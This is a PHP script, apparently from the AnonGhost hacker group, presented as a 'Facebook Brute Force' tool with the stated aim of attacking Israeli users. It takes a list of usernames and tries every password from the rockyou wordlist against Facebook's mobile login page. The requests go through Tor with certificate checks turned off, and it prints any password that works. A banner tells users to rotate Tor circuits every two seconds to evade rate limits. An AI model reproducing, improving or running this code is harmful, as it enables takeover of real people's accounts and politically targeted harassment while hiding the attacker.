<?php 
//die(phpinfo());
//ob_start();
@set_time_limit(0);
#################################################
#---------------------------------------------- #
# Facebook Brute Force 2015                     #
#Coded by : Mauritania Attacker&Noname-Haxor	#
#Greetz : All AnonGhost Members                 #
#This Tool Is For Erasing Israel in Fb          #
# --------------------------------------------- #
#################################################

echo "
<head>
<link rel='icon' type='image/ico' href='http://media.stateofq.com/photologue/photos/cache/facebook%20favicon_thumbnail.png'/>
<form method='POST'>
<title>Facebook Brute Force 2014</title>
</head>
<style>
textarea {
	resize:none;
	color: #1975FF ;
	border:1px solid #1975FF ;
	border-left: 4px solid #1975FF ;
}
input {
	color: ##33CCFF;
	border:1px dotted #33CCFF;
}
</style>";

echo "
<body text='#FFFFFF' background='http://i.imgur.com/yMmSxgU.jpg'>
<center><img src='http://i.imgur.com/Vl2suSf.gif'></center>
<center>Don't use this script without TOR BROWSER + TOR SWITCHER (set up the interval seconds from TOR SWITCHER TO 2 SECONDS)</center>
<p dir='ltr' align='center'>
<textarea cols='22' class='area'  rows='14' name='username'></textarea> 
<textarea cols='22' class='area'  rows='14' name='password'></textarea><br>
<br>
<input type='submit' name='scan' value='Start BruteForce'><br></p>";
if(isset($_POST['scan'])){
	function brute($user,$pass){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
		curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$user}&pass={$pass}");
		curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125"); 
		$login = curl_exec($ch);
		//print_r($login);
		return (strpos($login,'/reg/?')) ? true:false;
	}
	$username = explode("\n", $_POST['username']);
	foreach($username as $users){
		$users = @trim($users);
		$h=fopen("/usr/share/wordlist/rockyou.txt","r");
		while(($pass = fgets($h)) !== false){
			$pass = @trim($pass);
			if(brute($users,$pass)){
				die("This ==> ".$pass);
				ob_flush();
				flush();
			}
		}
		fclose($h);
	}
}
echo"<br>
<br>
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by: Mauritania Attacker&Noname-Hax0r</font></b></p></center>";
?>
